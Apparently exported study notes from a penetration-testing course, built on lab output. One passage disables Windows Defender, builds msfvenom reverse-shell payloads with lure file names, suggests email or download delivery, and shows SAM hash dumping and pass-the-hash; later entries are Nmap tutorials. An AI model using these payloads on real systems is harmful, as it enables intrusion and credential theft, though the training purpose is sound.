there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):\n\n#### Disable AV\n\nDisable AV\n\n```powershell-session\nPS C:\\Users\\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true\n```\n\nOnce AV is disabled, attempt to execute the code again.\n\n#### Server (attack box)\n\nServer (attack box)\n\n```shell-session\ndrxadz@htb[/htb]$ sudo nc -lvnp 443\n\nListening on 0.0.0.0 443\nConnection received on 10.129.36.68 49674\n\nPS C:\\Users\\htb-student> whoami\nws01\\htb-student\n```\n\n\n\n\n\n## Building A Stageless Payload\n\nNow let's build a simple stageless payload with msfvenom and break down the command.\n\n\n```shell-session\ndrxadz@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\n```\n\n#### Call MSFvenom\n\nCall MSFvenom\n\n```shell-session\nmsfvenom\n```\n\nDefines the tool used to make the payload.\n\n#### Creating a Payload\n\nCreating a Payload\n\n```shell-session\n-p \n```\n\nThis `option` indicates that msfvenom is creating a payload.\n\n#### Choosing the Payload based on Architecture\n\nChoosing the Payload based on Architecture\n\n```shell-session\nlinux/x64/shell_reverse_tcp \n```\n\nSpecifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).\n\n#### Address To Connect Back To\n\nAddress To Connect Back To\n\n```shell-session\nLHOST=10.10.14.113 LPORT=443 \n```\n\nWhen executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).\n\n#### Format To Generate Payload In\n\nFormat To Generate Payload In\n\n```shell-session\n-f elf \n```\n\nThe `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).\n\n#### Output\n\nOutput\n\n```shell-session\n> createbackup.elf\n```\n\nCreates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.\n\n---\n\n## Executing a Stageless Payload\n\nAt this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:\n\n- Email message with the file attached.\n- Download link on a website.\n- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).\n- Via flash drive as part of an onsite penetration test.\n\nOnce the file is on that system, it will also need to be executed.\n\nImagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.\n\n#### Ubuntu Payload\n\n![image](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)\n\nWe would have a listener ready to catch the connection on the attack box side upon successful execution.\n\n#### NC Connection\n\nNC Connection\n\n```shell-session\ndrxadz@htb[/htb]$ sudo nc -lvnp 443\n```\n\nWhen the file is executed, we see that we have caught a shell.\n\n#### Connection Established\n\nConnection Established\n\n```shell-session\ndrxadz@htb[/htb]$ sudo nc -lvnp 443\n\nListening on 0.0.0.0 443\nConnection received on 10.129.138.85 60892\nenv\nPWD=/home/htb-student/Downloads\ncd ..\nls\nDesktop\nDocuments\nDownloads\nMusic\nPictures\nPublic\nTemplates\nVideos\n```\n\nThis same concept can be used to create payloads for various platforms, including Windows.\n\n---\n\n## Building a simple Stageless Payload for a Windows system\n\nWe can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.\n\n#### Windows Payload\n\nWindows Payload\n\n```shell-session\ndrxadz@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of exe file: 73802 bytes\n```\n\nThe command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.\n\n---\n\n## Executing a Simple Stageless Payload On a Windows System\n\nThis is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.\n\n![image](https://academy.hackthebox.com/storage/modules/115/winpayload.png)\n\nIf the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.\n\nWindows Payload\n\n```shell-session\ndrxadz@htb[/htb]$ sudo nc -lvnp 443\n\nListening on 0.0.0.0 443\nConnection received on 10.129.144.5 49679\nMicrosoft Windows [Version 10.0.18362.1256]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\htb-student\\Downloads>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is DD25-26EB\n\n Directory of C:\\Users\\htb-student\\Downloads\n\n09/23/2021  10:26 AM    <DIR>          .\n09/23/2021  10:26 AM    <DIR>          ..\n09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe\n               1 File(s)         73,802 bytes\n               2 Dir(s)   9,997,516,800 bytes free\n```\n\n## Prominent Windows Exploits\n\nOver the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute:\n\n|**Vulnerability**|**Description**|\n|---|---|\n|`MS08-067`|MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.|\n|`Eternal Blue`|MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.|\n|`PrintNightmare`|A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).|\n|`BlueKeep`|CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.|\n|`Sigred`|CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.|\n|`SeriousSam`|CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\\Windows\\system32\\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.|\n|`Zerologon`|CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.|\n\n\n## Payload Generation\n\nWe have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.\n\n|**Resource**|**Description**|\n|---|---|\n|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.|\n|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.|\n|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.|\n|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.|\n|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.|\n\n\n\n#### Enumerating Logged-on Users\n\nImagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.\n\n```shell-session\ncrackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n```\n\n\n#### Extract Hashes from SAM Database\n\nThe Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:\n\n- Authenticate as another user.\n- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.\n- Pass The Hash. We will discuss it later in this section.\n\n\n```bash\ndrxadz@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes\nSMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\nSMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::\nSMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\nSMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::\nSMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database\n```\n\n\n#### Pass-the-Hash (PtH)\n\nIf we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:\n\n\n```shell-session\ndrxadz@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/01-Cheet Sheet Network Enumeration",
    "path": "02_CPTS/02_Network Enumeration with Nmap/01-Cheet Sheet Network Enumeration.md",
    "title": "01 Cheet Sheet Network Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Scanning Options | Nmap Option      | Description                                                        | | -------------------- | --------------------------------------------------------------------...",
    "category": "02_CPTS",
    "content": "## Scanning Options\n\n| **Nmap Option**      | **Description**                                                        |\n| -------------------- | ---------------------------------------------------------------------- |\n| `10.10.10.0/24`      | Target network range.                                                  |\n| `-sn`                | Disables port scanning.                                                |\n| `-Pn`                | Disables ICMP Echo Requests                                            |\n| `-n`                 | Disables DNS Resolution.                                               |\n| `-PE`                | Performs the ping scan by using ICMP Echo Requests against the target. |\n| `--packet-trace`     | Shows all packets sent and received.                                   |\n| `--reason`           | Displays the reason for a specific result.                             |\n| `--disable-arp-ping` | Disables ARP Ping Requests.                                            |\n| `--top-ports=<num>`  | Scans the specified top ports that have been defined as most frequent. |\n| `-p-`                | Scan all ports.                                                        |\n| `-p22-110`           | Scan all ports between 22 and 110.                                     |\n| `-p22,25`            | Scans only the specified ports 22 and 25.                              |\n| `-F`                 | Scans top 100 ports.                                                   |\n| `-sS`                | Performs an TCP SYN-Scan.                                              |\n| `-sA`                | Performs an TCP ACK-Scan.                                              |\n| `-sU`                | Performs an UDP Scan.                                                  |\n| `-sV`                | Scans the discovered services for their versions.                      |\n| `-sC`                | Perform a Script Scan with scripts that are categorized as \"default\".  |\n| `--script <script>`  | Performs a Script Scan by using the specified scripts.                 |\n| `-O`                 | Performs an OS Detection Scan to determine the OS of the target.       |\n| `-A`                 | Performs OS Detection, Service Detection, and traceroute scans.        |\n| `-D RND:5`           | Sets the number of random Decoys that will be used to scan the target. |\n| `-e`                 | Specifies the network interface that is used for the scan.             |\n| `-S 10.10.10.200`    | Specifies the source IP address for the scan.                          |\n| `-g`                 | Specifies the source port for the scan.                                |\n| `--dns-server <ns>`  | DNS resolution is performed by using a specified name server.          |\n\n## Output Options\n\n|**Nmap Option**|**Description**|\n|---|---|\n|`-oA filename`|Stores the results in all available formats starting with the name of \"filename\".|\n|`-oN filename`|Stores the results in normal format with the name \"filename\".|\n|`-oG filename`|Stores the results in \"grepable\" format with the name of \"filename\".|\n|`-oX filename`|Stores the results in XML format with the name of \"filename\".|\n\n## Performance Options\n\n|**Nmap Option**|**Description**|\n|---|---|\n|`--max-retries <num>`|Sets the number of retries for scans of specific ports.|\n|`--stats-every=5s`|Displays scan's status every 5 seconds.|\n|`-v/-vv`|Displays verbose output during the scan.|\n|`--initial-rtt-timeout 50ms`|Sets the specified time value as initial RTT timeout.|\n|`--max-rtt-timeout 100ms`|Sets the specified time value as maximum RTT timeout.|\n|`--min-rate 300`|Sets the number of packets that will be sent simultaneously.|\n|`-T <0-5>`|Specifies the specific timing template.|\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/02-Enumeration",
    "path": "02_CPTS/02_Network Enumeration with Nmap/02-Enumeration.md",
    "title": "02 Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Enumeration is the most critical part of all. The art, the difficulty, and the goal are not to gain access to our target computer. Instead, it is identifying all of the ways we could attack a target w...",
    "category": "02_CPTS",
    "content": "`Enumeration` is the most critical part of all. The art, the difficulty, and the goal are not to gain access to our target computer. Instead, it is identifying all of the ways we could attack a target we must find.\n\nIt is not just based on the tools we use. They will only do much good if we know what to do with the information we get from them. The tools are just tools, and tools alone should never replace our knowledge and our attention to detail. Here it is much more about actively interacting with the individual services to see what information they provide us and what possibilities they offer us.\n\nIt is essential to understand how these services work and what syntax they use for effective communication and interaction with the different services.\n\nThis phase aims to improve our knowledge and understanding of the technologies, protocols, and how they work and learn to deal with new information and adapt to our already acquired knowledge. Enumeration is collecting as much information as possible. The more information we have, the easier it will be for us to find vectors of attack.\n\nImagine the following situation:\n\nOur partner is not at home and has misplaced our car keys. We call our partner and ask where the keys are. If we get an answer like \"in the living room,\" it is entirely unclear and can take much time to find them there. However, what if our partner tells us something like \"in the living room on the white shelf, next to the TV, in the third drawer\"? As a result, it will be much easier to find them.\n\nIt's not hard to get access to the target system once we know how to do it. Most of the ways we can get access we can narrow down to the following two points:\n\n- `Functions and/or resources that allow us to interact with the target and/or provide additional information.`\n    \n- `Information that provides us with even more important information to access our target.`\n    \n\nWhen scanning and inspecting, we look exactly for these two possibilities. Most of the information we get comes from misconfigurations or neglect of security for the respective services. Misconfigurations are either the result of ignorance or a wrong security mindset. For example, if the administrator only relies on the firewall, Group Policy Objects (GPOs), and continuous updates, it is often not enough to secure the network.\n\n`Enumeration is the key`.\n\nThat's what most people say, and they are right. However, it is too often misunderstood. Most people understand that they haven't tried all the tools to get the information they need. Most of the time, however, it's not the tools we haven't tried, but rather the fact that we don't know how to interact with the service and what's relevant.\n\nThat's precisely the reason why so many people stay stuck in one spot and don't get ahead. Had these people invested a couple of hours learning more about the service, how it works, and what it is meant for, they would save a few hours or even days from reaching their goal and get access to the system.\n\n`Manual enumeration` is a `critical` component. Many scanning tools simplify and accelerate the process. However, these cannot always bypass the security measures of the services. The easiest way to illustrate this is to use the following example:\n\nMost scanning tools have a timeout set until they receive a response from the service. If this tool does not respond within a specific time, this service/port will be marked as closed, filtered, or unknown. In the last two cases, we will still be able to work with it. However, if a port is marked as closed and Nmap doesn't show it to us, we will be in a bad situation. This service/port may provide us with the opportunity to find a way to access the system. Therefore, this result can take much unnecessary time until we find it.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/03-Introduction to Nmap",
    "path": "02_CPTS/02_Network Enumeration with Nmap/03-Introduction to Nmap.md",
    "title": "03 Introduction To Nmap",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Network Mapper (Nmap) is an open-source network analysis and security auditing tool written in C, C++, Python, and Lua. It is designed to scan networks and identify which hosts are available on the ne...",
    "category": "02_CPTS",
    "content": "Network Mapper (`Nmap`) is an open-source network analysis and security auditing tool written in C, C++, Python, and Lua. It is designed to scan networks and identify which hosts are available on the network using raw packets, and services and applications, including the name and version, where possible. It can also identify the operating systems and versions of these hosts. Besides other features, Nmap also offers scanning capabilities that can determine if packet filters, firewalls, or intrusion detection systems (IDS) are configured as needed.\n\n---\n\n## Use Cases\n\nThe tool is one of the most used tools by network administrators and IT security specialists. It is used to:\n\n- Audit the security aspects of networks\n- Simulate penetration tests\n- Check firewall and IDS settings and configurations\n- Types of possible connections\n- Network mapping\n- Response analysis\n- Identify open ports\n- Vulnerability assessment as well.\n\n---\n\n## Nmap Architecture\n\nNmap offers many different types of scans that can be used to obtain various results about our targets. Basically, Nmap can be divided into the following scanning techniques:\n\n- Host discovery\n- Port scanning\n- Service enumeration and detection\n- OS detection\n- Scriptable interaction with the target service (Nmap Scripting Engine)\n\n---\n\n## Syntax\n\nThe syntax for Nmap is fairly simple and looks like this:\n\nIntroduction to Nmap\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap <scan types> <options> <target>\n```\n\n---\n\n## Scan Techniques\n\nNmap offers many different scanning techniques, making different types of connections and using differently structured packets to send. Here we can see all the scanning techniques Nmap offers:\n\nIntroduction to Nmap\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap --help\n\n<SNIP>\nSCAN TECHNIQUES:\n  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans\n  -sU: UDP Scan\n  -sN/sF/sX: TCP Null, FIN, and Xmas scans\n  --scanflags <flags>: Customize TCP scan flags\n  -sI <zombie host[:probeport]>: Idle scan\n  -sY/sZ: SCTP INIT/COOKIE-ECHO scans\n  -sO: IP protocol scan\n  -b <FTP relay host>: FTP bounce scan\n<SNIP>\n```\n\nFor example, the TCP-SYN scan (`-sS`) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods. This scan method makes it possible to scan several thousand ports per second. The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.\n\n- If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects that the port is `open`.\n- If the target responds with an `RST` flagged packet, it is an indicator that the port is `closed`.\n- If Nmap does not receive a packet back, it will display it as `filtered`. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.\n\nLet us take an example of such a scan.\n\nIntroduction to Nmap\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sS localhost\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 22:50 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000010s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5432/tcp open  postgresql\n5901/tcp open  vnc-1\n\nNmap done: 1 IP address (1 host up) scanned in 0.18 seconds\n```\n\nIn this example, we can see that we have four different TCP ports open. In the first column, we see the number of the port. Then, in the second column, we see the service's status and then what kind of service it is.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/04-Host Discovery",
    "path": "02_CPTS/02_Network Enumeration with Nmap/04-Host Discovery.md",
    "title": "04 Host Discovery",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "- [[#Scan Network Range|Scan Network Range]] - [[#Scan IP List|Scan IP List]] - [[#Scan Multiple IPs|Scan Multiple IPs]] - [[#Scan Single IP|Scan Single IP]] When we need to conduct an internal penetr...",
    "category": "02_CPTS",
    "content": "- [[#Scan Network Range|Scan Network Range]]\n- [[#Scan IP List|Scan IP List]]\n- [[#Scan Multiple IPs|Scan Multiple IPs]]\n- [[#Scan Single IP|Scan Single IP]]\n\nWhen we need to conduct an internal penetration test for the entire network of a company, for example, then we should, first of all, get an overview of which systems are online that we can work with. To actively discover such systems on the network, we can use various `Nmap` host discovery options. There are many options `Nmap` provides to determine whether our target is alive or not. The most effective host discovery method is to use **ICMP echo requests**, which we will look into.\n\nIt is always recommended to store every single scan. This can later be used for comparison, documentation, and reporting. After all, different tools may produce different results. Therefore it can be beneficial to distinguish which tool produces which results.\n\n#### Scan Network Range\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n\n10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.0/24`|Target network range.|\n|`-sn`|Disables port scanning.|\n|`-oA tnet`|Stores the results in all formats starting with the name 'tnet'.|\n\nThis scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not. We will take a closer look at these techniques in \"`Firewall and IDS Evasion`\".\n\n---\n\n## Scan IP List\n\nDuring an internal penetration test, it is not uncommon for us to be provided with an IP list with the hosts we need to test. `Nmap` also gives us the option of working with lists and reading the hosts from this list instead of manually defining or typing them in.\n\nSuch a list could look something like this:\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat hosts.lst\n\n10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28\n```\n\nIf we use the same scanning technique on the predefined list, the command will look like this:\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`-sn`|Disables port scanning.|\n|`-oA tnet`|Stores the results in all formats starting with the name 'tnet'.|\n|`-iL`|Performs defined scans against targets in provided 'hosts.lst' list.|\n\nIn this example, we see that only 3 of 7 hosts are active. Remember, this may mean that the other hosts ignore the default **ICMP echo requests** because of their firewall configurations. Since `Nmap` does not receive a response, it marks those hosts as inactive.\n\n---\n\n## Scan Multiple IPs\n\nIt can also happen that we only need to scan a small part of a network. An alternative to the method we used last time is to specify multiple IP addresses.\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n```\n\nIf these IP addresses are next to each other, we can also define the range in the respective octet.\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n```\n\n---\n\n## Scan Single IP\n\nBefore we scan a single host for open ports and its services, we first have to determine if it is alive or not. For this, we can use the same method as before.\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST\nNmap scan report for 10.129.2.18\nHost is up (0.087s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.18`|Performs defined scans against the target.|\n|`-sn`|Disables port scanning.|\n|`-oA host`|Stores the results in all formats starting with the name 'host'.|\n\nIf we disable port scan (`-sn`), Nmap automatically ping scan with `ICMP Echo Requests` (`-PE`). Once such a request is sent, we usually expect an `ICMP reply` if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an `ARP ping` resulting in an `ARP reply`. We can confirm this with the \"`--packet-trace`\" option. To ensure that ICMP echo requests are sent, we also define the option (`-PE`) for this.\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up (0.023s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.18`|Performs defined scans against the target.|\n|`-sn`|Disables port scanning.|\n|`-oA host`|Stores the results in all formats starting with the name 'host'.|\n|`-PE`|Performs the ping scan by using 'ICMP Echo requests' against the target.|\n|`--packet-trace`|Shows all packets sent and received|\n\n---\n\nAnother way to determine why Nmap has our target marked as \"alive\" is with the \"`--reason`\" option.\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up, received arp-response (0.028s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.03 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.18`|Performs defined scans against the target.|\n|`-sn`|Disables port scanning.|\n|`-oA host`|Stores the results in all formats starting with the name 'host'.|\n|`-PE`|Performs the ping scan by using 'ICMP Echo requests' against the target.|\n|`--reason`|Displays the reason for specific result.|\n\n---\n\nWe see here that `Nmap` does indeed detect whether the host is alive or not through the `ARP request` and `ARP reply` alone. To disable ARP requests and scan our target with the desired `ICMP echo requests`, we can disable ARP pings by setting the \"`--disable-arp-ping`\" option. Then we can scan our target again and look at the packets sent and received.\n\nHost Discovery\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CEST\nSENT (0.0107s) ICMP [10.10.14.2 > 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]\nRCVD (0.0152s) ICMP [10.129.2.18 > 10.10.14.2 Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]\nNmap scan report for 10.129.2.18\nHost is up (0.086s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n```\n\nWe have already mentioned in the \"`Learning Process`,\" and at the beginning of this module, it is essential to pay attention to details. An `ICMP echo request` can help us determine if our target is alive and identify its system. More strategies about host discovery can be found at:\n\n[https://nmap.org/book/host-discovery-strategies.html](https://nmap.org/book/host-discovery-strategies.html)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/05-Host and Port Scanning",
    "path": "02_CPTS/02_Network Enumeration with Nmap/05-Host and Port Scanning.md",
    "title": "05 Host And Port Scanning",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "It is essential to understand how the tool we use works and how it performs and processes the different functions. We will only understand the results if we know what they mean and how they are obtain...",
    "category": "02_CPTS",
    "content": "It is essential to understand how the tool we use works and how it performs and processes the different functions. We will only understand the results if we know what they mean and how they are obtained. Therefore we will take a closer look at and analyze some of the scanning methods. After we have found out that our target is alive, we want to get a more accurate picture of the system. The information we need includes:\n\n- Open ports and its services\n- Service versions\n- Information that the services provided\n- Operating system\n\nThere are a total of 6 different states for a scanned port we can obtain:\n\n|**State**|**Description**|\n|---|---|\n|`open`|This indicates that the connection to the scanned port has been established. These connections can be **TCP connections**, **UDP datagrams** as well as **SCTP associations**.|\n|`closed`|When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an `RST` flag. This scanning method can also be used to determine if our target is alive or not.|\n|`filtered`|Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.|\n|`unfiltered`|This 